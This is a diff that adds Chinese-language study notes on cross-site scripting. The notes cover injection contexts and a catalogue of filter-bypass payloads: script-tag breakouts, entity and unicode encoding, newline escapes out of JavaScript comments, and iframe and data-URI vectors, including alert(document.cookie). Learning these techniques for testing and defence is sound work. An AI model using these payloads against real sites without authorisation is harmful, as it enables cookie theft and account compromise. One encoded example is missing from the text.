@@ -1,0 +1,113 @@
+xss漏洞起因
+    没有做好对应的过滤标签措施，导致攻击者可以注入恶意代码
+
+对付那种无任何过滤的
+    <img src=1 onerror=alert(document.cookie)>
+    <script>alert("xss")</script>
+    <script>eval(alert('xss'))</script>
+    <a href="javascript:localhoin=alert(1)">GO</a>
+
+输出在&lt;script&gt;&lt;/script&gt;之间的情况(意思就是你在script里面，得把前面的闭合了在注入语句，然后因为你在script里面直接输入语句即可)
+    先闭合上一个script然后在注入恶意代码:</script><script>alert("xss")
+    如果<,>,/等符号被过滤了可以用：eval(alert(1)) #eval()函数用于直接执行代码 参考：http://www.runoob.com/jsref/jsref-eval.html
+    
+输出在其他标签里面
+    注意：html转义后在标签的属性中会其到一定的绕过作用 参考文章：https://www.cnblogs.com/iceli/p/8598709.html
+    　当浏览器接受到一份HTML代码后，会对标签之间（<p>xxx</p>等，<script>除外)、标签的属性中（<a href='xxxx'>）进行实体字符解码变为相应的字符，而不会发挥出其本来该有的功能，如：&#60;被解码为<后仅被当作字符，而不会被当成标签名的起始。既然是字符串，那在href='xx'这些属性值本来就是字符串的地方可以作为一种可能的绕过的手段。如：
+        <a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;"></a>
+    如在<input>里，解决办法：<input type="text" value="" onclick="alert(1)">
+    出现在a标签的href里面，类似于：<a href="javascript:wds=''http://www.dddd.com".getElementById('ddd').value+'&g=<你输入的值>'>
+    由于在href里面，可以使用javascript。就构造<a href="javascript:wds=''http://www.dddd.com".getElementById('ddd').value+'&g=alert(1)'>
+    如果单引号等字符被过滤的话，使用：<a href="javascript:wds=''http://www.dddd.com".getElementById('ddd').value+'&g=alert&#x28;1&#x29'> //实体化被过滤的符号
+    
+ 宽字节xss：
+    如果页面用了gbk编码的话，可以用对应的编码进行编码被过滤的符号导致可以绕过过滤
+    
+ 空格被实体化过滤
+    注解：javascript的注释符为/**/ , //
+    当空格被过滤后，使用注释符来绕过。例子：
+    location.href="........."+"&ss=aaaa\"+"&from==1;function/**/from(){}//"+"&param=";
+    location.href="........."+"&ss=aaaa\"+"&from==1;alert(1);function/**/from(){}//"+"&param=";
+    
+    学到的js的一个特性：javascript会先解析函数在解析其他
+    例子：
+    a();
+    function as() {} 
+    
+    
+    而js执行顺序是：
+    function as() {}
+    a();
+    
+当输入的语句出现在注释里 (有机可乘的xss)
+    当输入的语句出现在js注释的源码的时候，加一个换行符就能引发xss
+    例如：http://xxx.com/jj.php?xxx=aaaaa
+    
+    <script>
+    //function  A() {
+    //    var g=getElementById(demo).value;
+    //    document.write(g);
+    //}
+    //document.write(你输入的)
+    document.write("wwww")
+;    </script>
+
+    构造的xss语句：http://xxx.com/jj.php?xxx=%0aalert(1) //) #通过%0a换行符，换到了没有注释的下一行然后闭合掉后面的括号
+
+使用反斜杆构造xss
+    当输入的语句处于多行js代码之中，使用\分开，例子：
+    <script>getTop().location.href="/cgi-bin/loginpage?autologin=n&errtype=1&verify=&clientuin="+"&t="+"&alias="+"&regalias="+"&delegate_url=%2Fcgi-bin%2Fframe_html%3Furl%3D%252Fcgi-bin%252Fsetting10%253Faction%253Dlist%2526t%253Dsetting10%2526ss%253Dindex%2526Mtype%253D1%2526clickpos%253D20%2526loc%253Ddelegate%252Cwebmap%252C%252C1"+"&title="+"&url=%2Fcgi-bin%2Flogin%3Fvt%3Dpassport%26ss%3Daaa%2522%26from%3Dbbb%5C%26delegate_url%3D%252Fcgi-bin%252Fframe_html%253Furl%253D%2525252Fcgi-bin%2525252Fsetting10%2525253Faction%2525253Dlist%25252526t%2525253Dsetting10%25252526ss%2525253Dindex%25252526Mtype%2525253D1%25252526clickpos%2525253D20%25252526loc%2525253Ddelegate%2525252Cwebmap%2525252C%2525252C1"+"&org_fun="+"&aliastype="+"&ss=aaa"+"&from=bbb"+"&param="+"&sp=6fa57ce5b3047ebMTM1NTQwOTA2Mg"+"&r=3ec785174fff5206ed6f0cf4a8c5e3c5"+"&ppp="+"&secpp="</script>
+    使用\分割语句然后想办法闭合
+    
+ ：反弹xss一般出现在url拦
+
+DOM型xss
+DOM型的xss就是通过输入，改变了js代码的一部分。dom型xss又分两种：
+1.可见型DOM xss，输入的东西改变了页面的源码。但是F12查看源码可见
+类似于：
+<strong id="titleshow">按职业1检索：aaaaaaa </strong></div>
+<script>
+if("aaaaaaa"=="")
+document.getElementById("titleshow").innerHTML="按地区检索：全部明星";
+if("职业1"=="职业1")
+document.getElementById("titleshow").innerHTML="按职业检索：aaaaaaa";
+if("职业1"=="职业2")
+document.getElementById("titleshow").innerHTML="按职业检索：aaaaaaa";
+if("职业1"=="职业3")
+document.getElementById("titleshow").innerHTML="按职业检索：aaaaaaa";
+</script>
+aaaaa为我们输入的，假设现在<,>被过滤了。但是\没被过滤，该如何构造xss呢
+由于\没有被过滤，使用unicode编码<和>，变为
+被url解释器解释完后为<a href="javascript:alert(1)"></a>，url中出现了javascript:，指明了后面的语句要当作js执行，所以再次把解释后的字符交给js解释器解释，可以弹窗。
+
+当js解释器在标识符名称(例如函数名，属性名等等)中遇到unicode编码会进行解码，并使其标志符照常生效。而在字符串中遇到unicode编码时会进行解码只会被当作字符串。如：
+
+ <script>\u0061\u006c\u0065\u0072\u0074(1)</script>
+ unicode编码在标签的属性之中可用，如果在输出使用不会影响上下文
+ 
+ 参考文章：https://www.cnblogs.com/iceli/p/8598709.html
+ 
+
+2.不可见型DOM xss
+    类似于DVWA里的DOM型xss，只能用调试工具定位。审核源代码是看不见的
+    记录一些DOM型xss常用的语句：
+    在iframe中执行js:<iframe onload="alert(1)"></iframe>
+                               <iframe src="javascript:alert(1)"></iframe>
+                               <iframe src="vbscript:msbox(1)"></iframe> IE执行VBScript代码
+                               <iframe src="data:text/html"><script>alert(1)</script> chrome执行data协议代码
+                               <iframe src="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"></iframe> 上面的变体
+                               <iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe> chrome下的srcdoc属性
+ 
+ 存储型xss：
+        一定要记住本节最开头的话，存储型XSS，输出的位置不一定出现在输入的位置。
+        7. 因而我们有时候需要逆向的思维，来寻找存储型XSS。 大概思路如下：
+        7.1 先找到输出点，然后猜测此处输出是否会被过滤。
+        7.2 如果觉得可能没过滤，我们再找到这个输出是在哪里输入的。
+        7.3 接着开始测试输入，看输出的效果。
+        7.4 如果没过滤，那么你就成功了，否则你可以放弃掉它。
+  
+  存储型xss payload：http://html5sec.org/
+    
+ 总结：在探测一个地方是否有xss的时候，插入好搜索的语句例如：aaaaaa。然后f12源码搜索，分析出现的地方，看看哪里能实现xss。如果有被过滤
+ 了，先试试html转义，注意闭合。当\符号没被过滤的时候可以使用unicode编码来进行代替被过滤的函数或符号 （前提是在script标签里）
+    
